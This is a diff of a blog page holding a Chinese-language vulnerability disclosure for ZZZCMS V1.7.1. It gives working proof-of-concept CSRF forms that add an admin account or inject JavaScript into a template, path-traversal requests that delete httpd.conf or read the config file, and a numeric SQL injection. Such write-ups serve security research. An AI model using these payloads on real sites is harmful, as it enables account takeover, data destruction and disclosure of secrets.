@@ -123,60 +123,60 @@
 
         <section class="post-content">
             <h2 id="ZZZCMS-V1-7-1-CSRF漏洞"><a href="#ZZZCMS-V1-7-1-CSRF漏洞" class="headerlink" title="ZZZCMS V1.7.1 CSRF漏洞"></a>ZZZCMS V1.7.1 CSRF漏洞</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a><strong>漏洞概述</strong></h3><p>​        漏洞存在的位置/adminxxx/save.php第456-508行。注：xxx为任意随机三位数字。</p>
-<p><img src="/.com//1.png" alt="img"></p>
-<p><img src="/.com//2.png" alt="img"></p>
+<p><img src="/2019/06/28/zzzcms/1.png" alt="img"></p>
+<p><img src="/2019/06/28/zzzcms/2.png" alt="img"></p>
 <p>​        可以看到save_user()函数接受了管理员的信息参数准备注册。在第479行处，仅对传入的数据是否符合格式和是否重复进行检查。如果满足格式并且不和数据库中的数据重复，就在488行进行插入数据库。当act变量值为user时，会调用save_user()函数。又由于该文件对是否登录进行了判断。因此，此处为一个CSRF漏洞，只需构造好恶意页面，诱使管理员访问，就可以任意添加一个管理员帐号。</p>
 <h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">'http://127.0.0.1/zzz17/admin261/save.php?act=user'</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'u_gid'</span> <span class="attr">value</span>=<span class="string">'2'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'username'</span> <span class="attr">value</span>=<span class="string">'zhhhy'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'password'</span> <span class="attr">value</span>=<span class="string">'6192288a'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'truename'</span> <span class="attr">value</span>=<span class="string">'zhhhy'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'mobile'</span> <span class="attr">value</span>=<span class="string">'15260131659'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'face'</span> <span class="attr">value</span>=<span class="string">'/zzz/plugins/face/face01.png'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'点击有惊喜'</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//3.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/3.png" alt></p>
 <p>当管理员在登录后台以后，点击该按钮就会发送一条POST请求增加一个管理员。</p>
-<p><img src="/.com//4.png" alt></p>
-<p><img src="/.com//6.png" alt></p>
-<pre><code>可以看到，回显显示了保存成功。我们在后台处可以看到确实增加了一个管理员，并且可以登录成功。</code></pre><p><img src="/.com//5.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/4.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/6.png" alt></p>
+<pre><code>可以看到，回显显示了保存成功。我们在后台处可以看到确实增加了一个管理员，并且可以登录成功。</code></pre><p><img src="/2019/06/28/zzzcms/5.png" alt></p>
 <h2 id="ZZZCMS-V1-7-1-存储型XSS漏洞"><a href="#ZZZCMS-V1-7-1-存储型XSS漏洞" class="headerlink" title="ZZZCMS V1.7.1 存储型XSS漏洞"></a>ZZZCMS V1.7.1 存储型XSS漏洞</h2><h3 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​    漏洞存在的位置/adminxxx/save.php第806-824行。 注：xxx为随机三位数字。</p>
-<p><img src="/.com//7.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/7.png" alt></p>
 <p>​         可以看到，在代码的第808行，进行了路径的判断，是否为后台目录文件。在代码的第811行，由白名单限制了只能修改指定文件夹里的文件。</p>
-<p><img src="/.com//8.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/8.png" alt></p>
 <p>​        观察目录可以发现，template目录底下有许多的JS文件修改。如果我们修改其中被引用的JS文件，那么就可以造成一个存储型的XSS攻击。<br>​         由于在zzz_file.php文件中的create_file()函数中，对可修改文件的后缀做了限制。因此，无法利用PHP执行任意代码。</p>
-<p><img src="/.com//9.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/9.png" alt></p>
 <h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">'http://127.0.0.1/zzz17/admin261/save.php?act=editfile'</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'file'</span> <span class="attr">value</span>=<span class="string">'/zzz17/template/pc/cn2016/js/img.js'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'hidden'</span> <span class="attr">name</span>=<span class="string">'filetext'</span> <span class="attr">value</span>=<span class="string">'alert(“zhhhy”);'</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">'submit'</span> <span class="attr">value</span>=<span class="string">'点击有惊喜'</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">form</span>&gt;</span> <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//10.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/10.png" alt></p>
 <p>​        当管理员在登录后台以后，点击该按钮就会发送一条POST请求修改/zzz17/template/pc/cn2016/js/img.js文件</p>
-<p><img src="/.com//11.png" alt></p>
-<p><img src="/.com//12.png" alt></p>
-<pre><code>可以看到，回显显示了保存成功。我们观察一下/zzz17/template/pc/cn2016/js/img.js 文件。可以发现代码成功被注入进去了。我们只要找到引用了这个文件的页面即可触发XSS。</code></pre><p><img src="/.com//13.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/11.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/12.png" alt></p>
+<pre><code>可以看到，回显显示了保存成功。我们观察一下/zzz17/template/pc/cn2016/js/img.js 文件。可以发现代码成功被注入进去了。我们只要找到引用了这个文件的页面即可触发XSS。</code></pre><p><img src="/2019/06/28/zzzcms/13.png" alt></p>
 <p>​            可以看到此处引用了/zzz17/template/pc/cn2016/js/img.js 文件。</p>
-<p><img src="/.com//14.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/14.png" alt></p>
 <p>​        第一次打开页面加载JS文件时会触发弹窗，效果如下：</p>
-<p><img src="/.com//15.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/15.png" alt></p>
 <h2 id="ZZZCMS-V1-7-1后台任意文件删除漏洞"><a href="#ZZZCMS-V1-7-1后台任意文件删除漏洞" class="headerlink" title="ZZZCMS V1.7.1后台任意文件删除漏洞"></a>ZZZCMS V1.7.1后台任意文件删除漏洞</h2><h3 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        漏洞存在的位置/adminxxx/save.php第825-831行。 注：xxx为随机三位数字。</p>
-<p><img src="/.com//17.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/17.png" alt></p>
 <p>​        可以看到在第828处定义了一个白名单，只允许这些文件夹里的文件被修改。但是由于未对跳转符号../进行过滤，导致可以进行目录穿越。而831行处调用的del_file()函数限制了我们不能删除php等文件。但是我们可以通过目录穿越的方式，删除掉其他系统文件，例如Apache的配置文件httpd.conf。 并且由于该函数未进行CSRF的保护，因此还可以通过CSRF来完成这个攻击。</p>
-<p><img src="/.com//18.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/18.png" alt></p>
 <h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><p>​        先看看我们Apache的配置文件的路径为：D:\phpstudy\PHPTutorial\Apache\conf</p>
-<p><img src="/.com//19.png" alt="19"></p>
+<p><img src="/2019/06/28/zzzcms/19.png" alt="19"></p>
 <p>判断好路径以后，进行路径穿越构造如下数据包：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST http://127.0.0.1/zzz17/admin/save.php?act=delfile</span><br><span class="line">path=/zzz17/upload/adimg/../../../../Apache/conf/httpd.conf</span><br></pre></td></tr></table></figure>
 
-<p><img src="/.com//20.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/20.png" alt></p>
 <p>​        发送数据包之后，再看文件，发现httpd.conf被删除了。此时重启Apache是无法启动的。</p>
-<p><img src="/.com//21.png" alt="21"></p>
+<p><img src="/2019/06/28/zzzcms/21.png" alt="21"></p>
 <h2 id="ZZZCMS-V1-7-1后台SQL注入漏洞"><a href="#ZZZCMS-V1-7-1后台SQL注入漏洞" class="headerlink" title="ZZZCMS V1.7.1后台SQL注入漏洞"></a>ZZZCMS V1.7.1后台SQL注入漏洞</h2><h3 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​        漏洞存在的位置/adminxxx/save.php第344-378行。 注：xxx为随机三位数字。</p>
-<p><img src="/.com//22.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/22.png" alt></p>
 <p>​        可以看到在第371行处调用了dp_update()函数。第二个参数采用字符串拼接的方式传入，而且由于传入的变量$tid未做强制类型转换，并且在SQL语句中未使用单引号进行包裹，因此是一处数字型注入。</p>
 <h3 id="POC-3"><a href="#POC-3" class="headerlink" title="POC"></a>POC</h3><p>前提条件：获得管理员帐号登录后台。并且tag管理中至少需要一条数据。</p>
-<p><img src="/.com//23.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/23.png" alt></p>
 <p>使用hackbar构造好post请求</p>
-<p><img src="/.com//24.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/24.png" alt></p>
 <p>​    发送请求，可以看到显示保存成功了。 由于 or 1=1是一定成立的，所以即便tid=-1不存在也能修改成功。</p>
-<p><img src="/.com//25.png" alt="25"></p>
+<p><img src="/2019/06/28/zzzcms/25.png" alt="25"></p>
 <p>​    再次访问tag管理页面，可以发现数据被修改了。</p>
-<p><img src="/.com//26.png" alt="26"></p>
+<p><img src="/2019/06/28/zzzcms/26.png" alt="26"></p>
 <h2 id="ZZZCMS-V1-7-1后台任意文件读取漏洞"><a href="#ZZZCMS-V1-7-1后台任意文件读取漏洞" class="headerlink" title="ZZZCMS V1.7.1后台任意文件读取漏洞"></a>ZZZCMS V1.7.1后台任意文件读取漏洞</h2><h3 id="漏洞概述-4"><a href="#漏洞概述-4" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>​            在后台可以查看缓存文件的内容，由于未对../以及后缀名的限制，导致可以读取任意PHP文件。</p>
-<p><img src="/.com//27" alt="1561713153538"></p>
+<p><img src="/2019/06/28/zzzcms/27" alt="1561713153538"></p>
 <p>可以在下图看到config.php的内容被读取出来了。</p>
-<p><img src="/.com//28.png" alt></p>
+<p><img src="/2019/06/28/zzzcms/28.png" alt></p>
 <h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET http://127.0.0.1/zzz17/admin/?module=templateedit&amp;type=/zzz17/runtime/cache/admin/../../../config/zzz_config.php</span><br></pre></td></tr></table></figure>
 
 
